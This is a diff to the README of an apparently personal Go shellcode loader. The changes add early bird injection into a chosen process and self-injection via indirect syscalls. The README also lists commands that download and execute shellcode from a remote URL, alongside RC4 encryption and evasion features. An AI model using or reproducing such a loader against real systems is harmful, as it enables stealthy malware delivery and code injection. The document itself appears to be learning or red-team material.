@@ -11,6 +11,9 @@ a simple shellcode loader that uses rc4 encryption, indirect syscalls and some s
 - download shellcode from remote url
 - system pointer encoding/decoding (not used by loader but interesting to me so left it in)
 - multiple injection attempts because either i suck or go sucks
+- supports multiple injection methods:
+  - early bird injection into selected process
+  - self-injection using indirect syscalls
 
 ## usage
 
@@ -18,12 +21,23 @@ a simple shellcode loader that uses rc4 encryption, indirect syscalls and some s
 # show help
 go run cmd/main.go -help
 
-# run demo mode (embedded messagebox)
+# run demo mode with default early bird injection
 go run cmd/main.go -demo
 
-# download and execute shellcode from url
+# run demo mode with self-injection
+go run cmd/main.go -demo -method indirect
+
+# download and execute shellcode from url (early bird)
 go run cmd/main.go -url <url>
+
+# download and execute shellcode from url (self-injection)
+go run cmd/main.go -url <url> -method indirect
 ```
+
+## injection methods
+
+- `earlybird` (default): Injects shellcode into a selected running process
+- `indirect`: Self-injects the shellcode into the current process
 
 ## build
 
@@ -41,6 +55,7 @@ go build -o rc4loader.exe cmd/main.go
 - creates `info.txt` with host information
 - displays encryption/decryption process
 - shows injection attempts and results
+- displays process selection menu (early bird mode only)
 
 ## author
 
